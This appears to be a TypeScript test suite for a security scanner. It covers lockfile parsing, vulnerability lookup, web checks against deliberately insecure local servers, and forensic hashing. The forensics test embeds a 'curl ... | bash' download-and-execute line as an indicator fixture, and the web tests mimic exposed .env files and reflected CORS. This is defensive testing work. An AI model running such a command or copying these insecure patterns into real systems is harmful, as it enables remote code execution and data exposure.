// Dependency parsing and lookup, the black-box web scanner against local
// test sites, and forensic hashing.

import { test, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import https from "node:https";
import { createHash } from "node:crypto";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AddressInfo } from "node:net";
import {
  collectDeps, scanDependencies, parsePackageLock, parseYarnLock, parsePnpmLock, parseRequirements,
  parsePipfileLock, parsePoetryLock, parseGoMod, parseGemfileLock, parseComposerLock, parseCargoLock, parsePomXml, parseNuget,
} from "../src/scanners/dependencies.ts";
import { scanWeb } from "../src/scanners/web.ts";
import { scanArtifact } from "../src/scanners/forensics.ts";

const names = (ds: { name: string; version: string }[]) => ds.map((d) => `${d.name}@${d.version}`).sort();

// ------------------------------------------------------------ dependencies

test("deps: every lockfile format is parsed to exact versions", () => {
  assert.deepEqual(names(parsePackageLock(JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/a": { version: "1.0.0" }, "node_modules/a/node_modules/@s/b": { version: "2.1.0" } } }))), ["@s/b@2.1.0", "a@1.0.0"]);
  assert.deepEqual(names(parsePackageLock(JSON.stringify({ lockfileVersion: 1, dependencies: { a: { version: "1.0.0", dependencies: { b: { version: "3.0.0" } } } } }))), ["a@1.0.0", "b@3.0.0"]);
  assert.deepEqual(names(parseYarnLock(`"lodash@^4.17.0", lodash@~4.17.1:\n  version "4.17.21"\n\n"@babel/core@^7.0.0":\n  version "7.24.0"\n`)), ["@babel/core@7.24.0", "lodash@4.17.21"]);
  assert.deepEqual(names(parsePnpmLock("packages:\n\n  /lodash@4.17.21:\n    resolution: {}\n  /@scope/pkg@1.2.3(react@18.0.0):\n    resolution: {}\n")), ["@scope/pkg@1.2.3", "lodash@4.17.21"]);
  assert.deepEqual(names(parseRequirements("flask==2.0.1\nrequests[security]==2.25.0\n# c\ndjango>=3\n")), ["flask@2.0.1", "requests@2.25.0"]);
  assert.deepEqual(names(parsePipfileLock(JSON.stringify({ default: { a: { version: "==1.0" } }, develop: { b: { version: "==2.0" } } }))), ["a@1.0", "b@2.0"]);
  assert.deepEqual(names(parsePoetryLock('[[package]]\nname = "a"\nversion = "1.2.3"\n\n[[package]]\nname = "b"\nversion = "0.1.0"\n')), ["a@1.2.3", "b@0.1.0"]);
  assert.deepEqual(names(parseCargoLock('[[package]]\nname = "hyper"\nversion = "0.14.10"\n')), ["hyper@0.14.10"]);
  assert.deepEqual(names(parseGoMod("module x\nrequire (\n\tgithub.com/a/b v1.2.3\n\tgolang.org/x/net v0.0.0-20210226172049-e18ecbb05110\n)\nrequire github.com/c/d v2.0.0+incompatible\n")), ["github.com/a/b@1.2.3", "github.com/c/d@2.0.0", "golang.org/x/net@0.0.0-20210226172049-e18ecbb05110"]);
  assert.deepEqual(names(parseGemfileLock("GEM\n  remote: x\n  specs:\n    rails (5.2.0)\n      actionpack (= 5.2.0)\n    nokogiri (1.10.0-x86_64-linux)\n\nPLATFORMS\n  ruby\n")), ["nokogiri@1.10.0", "rails@5.2.0"]);
  assert.deepEqual(names(parseComposerLock(JSON.stringify({ packages: [{ name: "a/b", version: "v1.2.3" }], "packages-dev": [{ name: "c/d", version: "2.0.0" }] }))), ["a/b@1.2.3", "c/d@2.0.0"]);
  assert.deepEqual(names(parsePomXml("<dependency><groupId>org.x</groupId><artifactId>y</artifactId><version>1.0.0</version></dependency><dependency><groupId>g</groupId><artifactId>a</artifactId><version>${v}</version></dependency>")), ["org.x:y@1.0.0"]);
  assert.deepEqual(names(parseNuget('<PackageReference Include="Newtonsoft.Json" Version="12.0.1" />')), ["Newtonsoft.Json@12.0.1"]);
});

test("deps: a lockfile wins over package.json in the same folder; monorepo folders are all read", () => {
  const deps = collectDeps([
    { rel: "package.json", text: JSON.stringify({ dependencies: { a: "^1.0.0" } }) },
    { rel: "package-lock.json", text: JSON.stringify({ packages: { "node_modules/a": { version: "1.4.2" } } }) },
    { rel: "web/package.json", text: JSON.stringify({ dependencies: { b: "^2.0.0" } }) },
  ]);
  assert.deepEqual(deps.map((d) => `${d.source}:${d.name}@${d.version}`).sort(), ["package-lock.json:a@1.4.2", "web/package.json:b@2.0.0"]);
});

test("deps: one finding per vulnerable package, rated by its worst issue, with the version that fixes all", async () => {
  const dir = mkdtempSync(join(tmpdir(), "ls-deps-"));
  try {
    writeFileSync(join(dir, "package-lock.json"), JSON.stringify({ packages: { "node_modules/lodash": { version: "4.17.4" }, "node_modules/ok": { version: "1.0.0" } } }));
    const fake = async (url: string, init?: any) => {
      if (url.endsWith("querybatch")) return new Response(JSON.stringify({ results: JSON.parse(init.body).queries.map((q: any) => (q.package.name === "lodash" ? { vulns: [{ id: "A" }, { id: "B" }] } : {})) }));
      return new Response(JSON.stringify(url.endsWith("/A")
        ? { id: "A", aliases: ["CVE-2019-10744"], summary: "Prototype pollution", database_specific: { severity: "CRITICAL" }, affected: [{ package: { name: "lodash" }, ranges: [{ events: [{ fixed: "4.17.12" }] }] }] }
        : { id: "B", summary: "ReDoS", database_specific: { severity: "MODERATE" }, affected: [{ package: { name: "lodash" }, ranges: [{ events: [{ fixed: "4.17.21" }] }] }] }));
    };
    const out = await scanDependencies(dir, undefined, fake as any);
    assert.equal(out.length, 1);
    assert.equal(out[0].severity, "critical");
    assert.match(out[0].detail, /CVE-2019-10744/);
    assert.match(out[0].remediation, /4\.17\.21/);
    const down = await scanDependencies(dir, undefined, (async () => { throw new Error("offline"); }) as any);
    assert.equal(down[0].rule, "dependency.osv-unreachable");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// -------------------------------------------------------------------- web

const servers: { close(): void }[] = [];
after(() => { for (const s of servers) s.close(); });
const listen = (srv: http.Server | https.Server) => new Promise<number>((r) => { servers.push(srv); srv.listen(0, "127.0.0.1", () => r((srv.address() as AddressInfo).port)); });

test("web: a sloppy single-page app is reported exactly, without soft-404 false alarms", async () => {
  const port = await listen(http.createServer((req, res) => {
    if (req.url === "/.env") { res.writeHead(200); return res.end("DB_PASSWORD=x\n"); }
    if (req.url === "/.git/HEAD") { res.writeHead(200); return res.end("ref: refs/heads/main\n"); }
    const h: Record<string, string> = { "content-type": "text/html", "x-powered-by": "Express", "set-cookie": "sid=1; Path=/" };
    if (req.headers.origin) { h["access-control-allow-origin"] = req.headers.origin; h["access-control-allow-credentials"] = "true"; }
    res.writeHead(200, h); res.end("<html><title>App</title><div id=root></div></html>"); // every path returns the app shell
  }));
  const out = await scanWeb(`http://127.0.0.1:${port}`);
  const got = out.map((f) => `${f.rule}:${f.severity}`).sort();
  assert.deepEqual(got, [
    "web.cookie.flags:medium", "web.cors.reflected:high", "web.exposed-file:critical", "web.exposed-file:high",
    "web.header.csp:medium", "web.header.frame:low", "web.header.referrer:info", "web.header.xcto:low",
    "web.info.powered-by:info", "web.no-https:high",
  ]);
});

test("web: weak headers are caught even when present; directory listing is caught", async () => {
  const port = await listen(http.createServer((_req, res) => {
    res.writeHead(200, { "content-type": "text/html", "content-security-policy": "script-src 'self' 'unsafe-inline' 'unsafe-eval'", "x-content-type-options": "nosniff", "referrer-policy": "no-referrer", "x-frame-options": "DENY" });
    res.end("<html><head><title>Index of /</title></head></html>");
  }));
  const out = await scanWeb(`http://127.0.0.1:${port}/`);
  assert.ok(out.some((f) => f.rule === "web.header.csp-weak"));
  assert.ok(out.some((f) => f.rule === "web.directory-listing"));
  assert.ok(!out.some((f) => f.rule === "web.header.csp"), "present CSP is not reported as missing");
});

test("web: cloud metadata addresses and bad URLs are refused", async () => {
  assert.equal((await scanWeb("http://169.254.169.254/latest/meta-data"))[0].rule, "web.blocked-internal");
  assert.equal((await scanWeb("ftp://example.com"))[0].rule, "web.bad-url");
});

test("web: an untrusted certificate is reported", { skip: !hasOpenssl() && "openssl not installed" }, async () => {
  const dir = mkdtempSync(join(tmpdir(), "ls-tls-"));
  execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2", "-subj", "/CN=localhost", "-keyout", join(dir, "k.pem"), "-out", join(dir, "c.pem")], { stdio: "ignore" });
  const port = await listen(https.createServer({ key: readFileSync(join(dir, "k.pem")), cert: readFileSync(join(dir, "c.pem")) }, (_q, s) => { s.writeHead(200); s.end("ok"); }));
  rmSync(dir, { recursive: true, force: true });
  const out = await scanWeb(`https://127.0.0.1:${port}`);
  assert.equal(out.find((f) => f.rule === "web.tls.untrusted")?.severity, "high");
});

function hasOpenssl(): boolean { try { execFileSync("openssl", ["version"], { stdio: "ignore" }); return true; } catch { return false; } }

// --------------------------------------------------------------- forensics

test("forensics: hashes match sha256 of the exact bytes, and indicators are found", async () => {
  const dir = mkdtempSync(join(tmpdir(), "ls-for-"));
  try {
    const bytes = Buffer.concat([Buffer.from([0, 255, 254, 1]), Buffer.from("\ncurl http://198.51.100.7/x.sh | bash\n")]);
    const p = join(dir, "evidence.bin");
    writeFileSync(p, bytes);
    const out = await scanArtifact(p);
    assert.equal(out.find((f) => f.rule === "forensic.hash")?.evidence, `sha256: ${createHash("sha256").update(bytes).digest("hex")}`);
    assert.ok(out.some((f) => f.rule === "forensic.ioc.download-exec"));
    assert.ok(out.some((f) => f.rule === "forensic.ioc.ip"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("forensics: a huge artifact is fully hashed but only partly read", async () => {
  const dir = mkdtempSync(join(tmpdir(), "ls-big-"));
  try {
    const p = join(dir, "big.log");
    const big = Buffer.alloc(9_000_000, "a");
    writeFileSync(p, big);
    const out = await scanArtifact(p);
    assert.equal(out.find((f) => f.rule === "forensic.hash")?.evidence, `sha256: ${createHash("sha256").update(big).digest("hex")}`);
    assert.ok(out.some((f) => f.rule === "forensic.partial"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
